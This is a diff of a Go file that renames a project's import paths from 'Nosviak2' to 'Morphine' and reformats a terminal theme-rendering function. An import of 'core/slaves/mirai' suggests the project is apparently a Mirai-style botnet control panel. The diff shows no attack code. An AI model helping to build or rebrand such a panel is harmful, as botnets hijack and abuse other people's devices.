@@ -1,12 +1,12 @@
 package language
 
 import (
-	"Nosviak2/core/clients/animations"
-	"Nosviak2/core/clients/sessions"
-	"Nosviak2/core/database"
-	"Nosviak2/core/sources/language/tfx"
-	"Nosviak2/core/slaves/mirai"
-	"Nosviak2/core/sources/views"
+	"Morphine/core/clients/animations"
+	"Morphine/core/clients/sessions"
+	"Morphine/core/database"
+	"Morphine/core/slaves/mirai"
+	termfx "Morphine/core/sources/language/tfx"
+	"Morphine/core/sources/views"
 	"errors"
 	"io"
 	"strconv"
@@ -14,8 +14,8 @@ import (
 	"time"
 )
 
-//stores the termfx information properly
-//this will register all the options without issues happening
+// stores the termfx information properly
+// this will register all the options without issues happening
 func MakeTermFX(f []string, s *sessions.Session) (string, error) {
 
 	//makes the termfx wrapper properly
@@ -121,18 +121,17 @@ func MakeTermFX(f []string, s *sessions.Session) (string, error) {
 	//tries to get properly without issues
 	//this will get without issues happening
 	value := views.GetView(path...) //gets within the theme properly
-	if value == nil { //checks if the theme was found properly
+	if value == nil {               //checks if the theme was found properly
 		//tries to get the default properly theme without issues happening
 		def := views.GetView(f...) //gets the default properly without issues
-		if def == nil { //error handles properly without issues happening on reqeust
-			return "", errors.New(strings.Join(f, "/")+" is classed as an invalid branding object")
+		if def == nil {            //error handles properly without issues happening on reqeust
+			return "", errors.New(strings.Join(f, "/") + " is classed as an invalid branding object")
 		}
 
 		//updates the default properly
 		//this will select the default branding without issues
 		value = def //updates to the default properly without issues
 	}
-
 
 	//executes the term properly
 	//this will ensure its done without any errors
